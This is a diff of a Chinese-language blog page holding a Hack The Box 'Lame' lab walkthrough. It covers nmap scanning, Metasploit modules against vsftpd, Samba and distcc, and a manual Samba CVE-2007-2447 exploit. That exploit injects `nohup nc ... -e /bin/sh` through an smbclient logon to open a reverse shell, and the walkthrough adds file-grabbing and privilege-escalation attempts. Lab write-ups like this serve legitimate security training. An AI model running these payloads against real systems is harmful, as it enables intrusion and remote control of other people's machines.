@@ -73,7 +73,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </ul>
 <h2 id="Note">Note</h2>
 <ul>
-<li><a href="/">recon</a></li>
+<li><a href="/oscp/Nmap-Tips">Nmap Tips</a></li>
 </ul>
 <h1 id="-v3">-</h1>
 <h1 id="Hack-The-Box-Writeup">[ Hack The Box Writeup ]</h1>
@@ -161,22 +161,187 @@ function sidebar_toggle() {
         <div class="book-content">
           <div class="book-post">
   <h1 id="Lame-Writeup">Lame Writeup</h1>
-<p><img src="./Lame.png" alt=""></p>
-<hr>
-<h2 id="信息收集">信息收集</h2>
+<p><img src="./1.png" alt=""></p>
+<h2 id="0x01-信息收集">0x01 信息收集</h2>
 <p>上来第一件事先扫下开放端口，刚开始先用脚本把全端口跑一遍。</p>
 <p>在目录下新建一个 nmap 文件夹用来放扫描结果，整个渗透过程中可能存在多阶段扫描，很多结果需要分类。</p>
-<p>第一步扫描可以取名为 <code>init.*</code>，放在 <code>nmap/</code> 下。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -O -p- -oA nmap/init 10.10.10.3</span><br></pre></td></tr></table></figure>
+<h3 id="1、TCP-Scan">1、TCP Scan</h3>
+<p>第一次扫描 TCP 端口可以取名为 <code>tcp.*</code>，放在 <code>nmap/</code> 下。这里有两种扫法**</p>
+<p><strong>直接扫全端口。</strong></p>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span><span class="token class-name">A</span> <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span>oA nmap<span class="token operator">/</span>tcp <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span></code></pre>
+<p><code>-A</code> == <code>-sC -sV -O -traceroute</code></p>
 <ul>
 <li><strong>-sC</strong>: 会执行默认脚本</li>
 <li><strong>-sV</strong>: 检测开放端口的服务版本</li>
 <li><strong>-O</strong>: 检测操作系统</li>
+<li><strong>-traceroute</strong>: 路由跟踪</li>
 <li><strong>-p-</strong>: 1-65535 全端口探测</li>
-<li><strong>-oA</strong>: 输出所有格式的信息并存为 nmap/init.*</li>
+<li><strong>-oA</strong>: 输出所有格式的信息并存为 nmap/tcp.*</li>
 </ul>
-<p>嫌速度慢可以先扫端口，然后根据开放端口扫详细。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 10.10.10.3</span><br><span class="line">nmap -sC -sV -O -p xx,xx,xx -oA nmap/init 10.10.10.3</span><br></pre></td></tr></table></figure>
+<p><strong>如果想先快速扫开放端口，再扫服务，差别不大，<a href="../../../oscp/Nmap-Tips/#0x02-%E6%89%AB%E6%8F%8F%E9%80%9F%E5%BA%A6">对比看这里</a>。</strong></p>
+<p>康康扫到了啥。</p>
+<ul>
+<li><strong>21</strong>: vsftpd 2.3.4，且允许匿名登录</li>
+<li><strong>22</strong>: openssh 4.7，允许 root 密码登录，可爆破</li>
+<li><strong>139</strong>: samba 3.x ~ 4.x，可能是漏洞版本</li>
+<li><strong>445</strong>: samba 3.0.20-Debian，可能是漏洞版本</li>
+<li><strong>3632</strong>: distccd v1，分布式编译器守护进程</li>
+</ul>
+<p><img src="./3.png" alt=""></p>
+<h3 id="2、UDP-Scan">2、UDP Scan</h3>
+<p>第二次扫描看看有没有开放的 UDP 端口，可以取名为 <code>udp.*</code>，放在 <code>namp</code> 下。</p>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">-</span>sU <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span>oA nmap<span class="token operator">/</span>udp <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span></code></pre>
+<p>没有扫到，无 UDP 端口开放。</p>
+<h2 id="0x02-根据端口逐一突破">0x02 根据端口逐一突破</h2>
+<p>对于每个端口，应该根据 <code>服务和对应版本</code>，搜寻是否有已公开的利用方式，搜寻的方式可以是：</p>
+<ul>
+<li><strong><a target="_blank" rel="noopener" href="http://www.google.com.hk">www.google.com.hk</a></strong></li>
+<li><strong><code>searchsploit</code> / <a target="_blank" rel="noopener" href="http://www.exploit-db.com">www.exploit-db.com</a></strong></li>
+<li><strong>kali 中的相应扫描器</strong>
+<ul>
+<li><code>nmap script</code></li>
+<li><code>msf auxiliary/exploit</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>建议先从 google 找，再用 <code>cve</code>、<code>服务名</code>、<code>版本</code> 等关键字在 <code>kali</code> 里搜</strong>，比较准。因为搜索引擎的检索比较可以智能地匹配你的关键字，而且可能有现成的利用方式。kali 里就没这么智能，关键字不匹配则比较难搜出来，即使本来就集成的 exp。</p>
+<p>当然你也可以直接 <code>kali</code> 里搜 <code>服务名</code> 或者 <code>版本</code>，看看说明，逐一筛选 <code>探测脚本</code> 或 <code>可用 exp</code>，能用的直接用，没找到的可以在 google 找下，可能已经公开 exp 但尚未集成 kali，这时候需要 <code>手工利用</code>。</p>
+<h3 id="1、Port-21">1、Port 21</h3>
+<p>google 一下发现 <code>vsftpd v2.3.4</code> 有公开 RCE，是开发哥写的后门，康康 <code>nmap</code> 有无脚本，路径在 <code>/usr/share/nmap/scripts/*</code>。</p>
+<pre class="language-java" data-language="java"><code class="language-java">ll <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>nmap<span class="token operator">/</span>scripts<span class="token operator">/</span>ftp<span class="token operator">*</span></code></pre>
+<p><img src="./13.png" alt=""><br>
+<code>nmap</code> 扫一下，没有详细漏洞回显，说明这里无法利用。</p>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">--</span>script ftp<span class="token operator">-</span>vsftpd<span class="token operator">-</span>backdoor <span class="token operator">-</span>p <span class="token number">21</span> <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span></code></pre>
+<p><img src="./5.png" alt=""><br>
+不甘心，上 MSF 找下 exp 试试，执行后没有发现开启 <code>6200</code> 后门端口，打不下来，可能<strong>已经修复，或是姿势不对？总之这里搞不来</strong>，下一位。。。</p>
+<pre class="language-java" data-language="java"><code class="language-java">search vsftp
+use exploit<span class="token operator">/</span>unix<span class="token operator">/</span>ftp<span class="token operator">/</span>vsftpd_234_backdoor
+show options
+set rhosts <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span>
+exploit</code></pre>
+<p><img src="./6.png" alt=""></p>
+<h3 id="2、Port-22">2、Port 22</h3>
+<p>google 一下没有找到有用的漏洞，dos 啥的没用。找下 <code>nmap</code> 相关脚本。</p>
+<pre class="language-java" data-language="java"><code class="language-java">ll <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>nmap<span class="token operator">/</span>scripts<span class="token operator">/</span>ssh<span class="token operator">*</span></code></pre>
+<p>脚本扫出允许公钥和密码登录，可以爆破。MSF 也没找到 exp。<strong>爆破这玩意不靠谱，先放一下</strong>没办法了再说。</p>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">--</span>script ftp<span class="token operator">-</span>vsftpd<span class="token operator">-</span>backdoor <span class="token operator">-</span>p <span class="token number">21</span> <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span></code></pre>
+<p><img src="./4.png" alt=""></p>
+<h3 id="3、Port-139、445">3、Port 139、445</h3>
+<p>这两个端口起的 <code>netbios-ssn</code> 服务（<a target="_blank" rel="noopener" href="https://blog.csdn.net/alone_map/article/details/51849460">同时支持 NTB 和 TCP/IP 协议</a>），用的是 <code>samba</code>，google 一下当前版本，找到几个可能用得上。</p>
+<ul>
+<li>3.0.x ~3.6.3: CVE-2012-1182</li>
+<li>3.5.0 ~ 4.4.14: cve-2017-7494 pipename</li>
+<li>3.2.20: cve-2007-2447，username_map_script RCE</li>
+<li>3.x: smbclient 后门</li>
+</ul>
+<p>MSF 开起来，搜关键字 <code>1182</code>，找到这个，该 exp 支持 <code>check</code>，配置参数，对每个 <code>target</code> 都 check 一下，报无法利用。</p>
+<pre class="language-java" data-language="java"><code class="language-java">search <span class="token number">1182</span>
+use exploit<span class="token operator">/</span>linux<span class="token operator">/</span>samba<span class="token operator">/</span>setinfopolicy_heap
+set rhosts <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span>
+set lhost <span class="token number">10.10</span><span class="token number">.14</span><span class="token number">.20</span>
+set target x
+check</code></pre>
+<p><img src="./14.png" alt=""><br>
+看下一个。</p>
+<pre class="language-java" data-language="java"><code class="language-java">search <span class="token number">7494</span></code></pre>
+<p>找到 <code>samba</code>。</p>
+<p><img src="./7.png" alt=""><br>
+<code>info</code> 命令查看 exp 介绍和配置。</p>
+<pre class="language-java" data-language="java"><code class="language-java">info exploit<span class="token operator">/</span>linux<span class="token operator">/</span>samba<span class="token operator">/</span>is_known_pipename</code></pre>
+<p>描述说需要一个有效的凭证，还得知道一个可写路径，条件比较苛刻，暂不可用。</p>
+<p><img src="./8.png" alt=""></p>
+<blockquote>
+<h4 id="补充一下">补充一下</h4>
+<p>前面 samba 的两个漏洞在 <code>nmap</code> 里是有探测脚本的，所以也可以通过 nmap 来判断漏洞是否存在，看个人习惯，我比较喜欢 msf 骑脸。</p>
+<pre class="language-java" data-language="java"><code class="language-java">nmap <span class="token operator">--</span>script samba<span class="token operator">-</span>vuln<span class="token operator">-</span>cve<span class="token operator">-</span><span class="token number">2012</span><span class="token operator">-</span><span class="token number">1182.</span>nse <span class="token operator">-</span>p <span class="token number">139</span><span class="token punctuation">,</span><span class="token number">445</span> <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span></code></pre>
+<p><img src="./15.png" alt=""></p>
+</blockquote>
+<p>看下一个。</p>
+<pre class="language-java" data-language="java"><code class="language-java">search <span class="token number">2447</span></code></pre>
+<p>找到 <code>samba</code>。</p>
+<p><img src="./9.png" alt=""><br>
+<code>info</code> 是个好东西，要常用。</p>
+<pre class="language-java" data-language="java"><code class="language-java">info exploit<span class="token operator">/</span>multi<span class="token operator">/</span>samba<span class="token operator">/</span>usermap_script</code></pre>
+<p>根据描述，该 exp 可以利用 <code>3.0.20 ~ 3.0.25rc3</code> 版本 samba 存在的 RCE 漏洞，没啥其他条件。<br>
+根据前面信息收集，靶机版本为 <code>3.0.20</code> 符合要求。</p>
+<p><img src="./10.png" alt=""></p>
+<h4 id="姿势一：msf-一键-getshell">姿势一：msf 一键 getshell</h4>
+<p>设置好相应参数，<code>exploit</code> 执行。有几个地方需要注意一下。</p>
+<ul>
+<li>rport 默认 139，但是根据扫描结果，139 端口并未探明服务版本，而是给了一个比较大的区间 <code>3.x ~ 4.x</code>，所以先选了<strong>确定存在漏洞版本的 445 端口</strong>。</li>
+<li>lhost 默认应该会取一个距离目标最近的 ip（纯个人判断，未了解这里的取值机制），所以这里默认取 <code>10.10.10.133</code>，但这 ip 并不是我的 vpn ip，只是碰巧之前设置内网 ip 的时候配了个 <code>10.10.10.x</code>，所以这里要改成 vpn ip <code>10.10.14.11</code>，一般情况下<strong>默认取值为 vpn ip 不需要改</strong>。</li>
+</ul>
+<pre class="language-java" data-language="java"><code class="language-java">use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>samba<span class="token operator">/</span>usermap_script
+set rhosts <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span>
+set rport <span class="token number">445</span>
+set lhost <span class="token number">10.10</span><span class="token number">.14</span><span class="token number">.11</span>
+exploit</code></pre>
+<p>执行以后看到收到反弹 shell，看到 <code>Command shell session 1 opened (10.10.14.11:4444 -&gt; 10.10.10.3:60557) at 2020-11-08 02:28:38 +0800</code>，会话生成。<br>
+输入命令 <code>hostname</code>、<code>id</code> 确认获取到靶机 <code>root</code> 权限。</p>
+<pre class="language-java" data-language="java"><code class="language-java">hostname
+id</code></pre>
+<p><img src="./11.png" alt=""></p>
+<h4 id="姿势二：手操-N-键-getshell">姿势二：手操 N 键 getshell</h4>
+<p>手动利用先看下漏洞原理。</p>
+<blockquote>
+<p><strong>Samba 中负责在 SAM 数据库更新用户口令的代码未经过滤便将用户输入传输给了 /bin/sh。如果在调用 smb.conf 中定义的外部脚本时，通过对 /bin/sh 的 MS-RPC 调用提交了恶意输入的话，就可能允许攻击者以 nobody （匿名）用户的权限执行任意命令。<a target="_blank" rel="noopener" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447">CVE-2007-2447</a></strong></p>
+</blockquote>
+<p>所以利用条件有 3 个：</p>
+<ul>
+<li>可登录的账号</li>
+<li>有权限的（可访问）共享文件夹</li>
+<li>在登录时提交恶意输入使命令执行</li>
+</ul>
+<p>首先 <code>smbclient</code> 列一下靶机的共享列表，然后 <code>smbmap</code> 查看权限。</p>
+<pre class="language-java" data-language="java"><code class="language-java">smbclient <span class="token operator">-</span><span class="token class-name">L</span> <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span>
+smbmap <span class="token operator">-</span><span class="token class-name">H</span> <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span></code></pre>
+<p>得到了前两个条件：</p>
+<ul>
+<li>允许匿名登录</li>
+<li>/tmp 文件夹对匿名用户具有读写权限</li>
+</ul>
+<p><img src="./17.png" alt=""></p>
+<p>所以接下来只需要在登录时提交 <code>payload</code> 即可，输入点在 <code>username</code>, 构造方式为：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token string">"/=<span class="token variable"><span class="token variable">`</span><span class="token function">nohup</span> <span class="token string">" + payload.encoded + "</span><span class="token variable">`</span></span>"</span></code></pre>
+<p><strong>最终利用</strong>：在本地起一个监听 <code>4444</code>，然后通过登录传入反弹 shell 命令，命令执行后 getshell。</p>
+<pre class="language-python" data-language="python"><code class="language-python">nc <span class="token operator">-</span>lvvp <span class="token number">4444</span>                                         <span class="token comment"># 本地起监听 4444</span>
+smbclient <span class="token operator">//</span><span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span><span class="token operator">/</span>tmp                            <span class="token comment"># 匿名登录、连接共享目录</span>
+logon <span class="token string">"/=`nohup nc -nv 10.10.14.20 4444 -e /bin/sh`"</span>  <span class="token comment"># 登录传入 payload</span></code></pre>
+<p><img src="./18.png" alt=""><br>
+<img src="./16.png" alt=""></p>
+<h4 id="姿势三：挂载根目录获取-flag">姿势三：挂载根目录获取 flag</h4>
+<p>思路就是把靶机根目挂载到共享文件夹，然后通过 smb 可以访问到根目录文件。</p>
+<pre class="language-java" data-language="java"><code class="language-java">use auxiliary<span class="token operator">/</span>admin<span class="token operator">/</span>smb<span class="token operator">/</span>samba_symlink_traversal
+set rhosts <span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span>
+set smbshare tmp
+exploit</code></pre>
+<p>可以看到靶机根目录已经挂载到共享文件夹 <code>/tmp/rootfs</code> 下，然后连上去翻文件。</p>
+<pre class="language-python" data-language="python"><code class="language-python">smbclient <span class="token operator">//</span><span class="token number">10.10</span><span class="token number">.10</span><span class="token number">.3</span><span class="token operator">/</span>tmp                            <span class="token comment"># 匿名登录、连接共享目录</span>
+ls rootfs<span class="token operator">/</span>home<span class="token operator">/</span>makis<span class="token operator">/</span>user<span class="token punctuation">.</span>txt                         <span class="token comment"># 找到 flag</span>
+get rootfs<span class="token operator">/</span>home<span class="token operator">/</span>makis<span class="token operator">/</span>user<span class="token punctuation">.</span>txt                        <span class="token comment"># 下载到本地查看，获取 flag</span></code></pre>
+<p><img src="./19.png" alt=""></p>
+<blockquote>
+<h4 id="TODO-这个姿势目前没拿到-root，记个待办。">TODO: 这个姿势目前没拿到 root，记个待办。</h4>
+<ul>
+<li>匿名登录为普通用户权限，无法访问 <code>root/*</code> 下的文件，所以看不到 root.txt</li>
+<li>尝试挂载到本地 <code>mount -t nfs 10.10.10.3:/tmp /tmp/rootme</code> <code>smbmount //10.10.10.3/tmp  /tmp/rootme -o rhh</code> 没用，应该姿势没对 <a target="_blank" rel="noopener" href="https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/">mount</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/eager7/article/details/8365458">smbmount</a></li>
+<li>尝试 <code>上传/写入公钥</code> 没成功，感觉也是姿势不对 <a target="_blank" rel="noopener" href="https://blog.csdn.net/punk_lover/article/details/40040967">使用的命令</a></li>
+</ul>
+<p>估计不需要什么提权操作，写入 <code>ssh 公钥</code>是突破口，烦死了，这个<strong>有空再研究</strong>。</p>
+</blockquote>
+<h3 id="4、Port-3626">4、Port 3626</h3>
+<p>照例先查，nmap 有脚本可以扫、可以加参数执行命令。</p>
+<p><img src="./21.png" alt=""><br>
+msf 有 exp 可以直接 getshell。</p>
+<p><img src="./22.png" alt=""><br>
+问题来了，拿到普通用户 <code>daemon</code> 权限，需要提权。查看内核版本为 <code>2.6.24-16-server</code>。</p>
+<p><img src="./23.png" alt=""><br>
+尝试 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40839">脏牛</a> 和 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/5093">CVE-2008–0600</a> 不成功。</p>
+<p>尝试 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/8572">CVE-2009-1185</a>。<br>
+下载 exp，传到机器上编译 <code>gcc 1234.c -o 1234</code>，获取 netlink PID <code>cat /proc/net/netlink</code>，执行提权的时候，会运行 <code>/tmp/run</code>（得自己加一个反弹 shell 脚本，命名为 /tmp/run），反弹到 kali 上获取 <code>root-shell</code>。（TODO: 补图）</p>
+<h2 id="0x03-Catch-The-Flag">0x03 Catch The Flag</h2>
+<p>翻文件，flag 一般在用户个人目录下，最后在 <code>/root/root.txt</code>、<code>/home/makis/user.txt</code> 找到 flag。</p>
+<p><img src="./12.png" alt=""></p>
 
 </div>
 
